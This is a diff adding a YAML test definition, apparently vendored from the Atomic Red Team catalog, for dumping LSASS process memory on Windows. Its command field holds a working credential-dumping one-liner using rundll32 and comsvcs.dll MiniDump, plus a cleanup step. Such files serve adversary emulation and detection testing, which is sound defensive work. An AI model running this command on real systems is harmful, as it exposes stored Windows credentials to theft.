@@ -1,0 +1,20 @@
+# Vendored minimal subset of redcanaryco/atomic-red-team (MIT). Real upstream
+# commands; full catalog available via CSCTL_ATOMICS_PATH.
+attack_technique: T1003.001
+display_name: 'OS Credential Dumping: LSASS Memory'
+atomic_tests:
+- name: Dump LSASS.exe Memory using comsvcs.dll
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Output dump file path
+      type: path
+      default: '%TEMP%\lsass.dmp'
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id #{output_file} full
+    cleanup_command: |
+      Remove-Item #{output_file} -ErrorAction Ignore
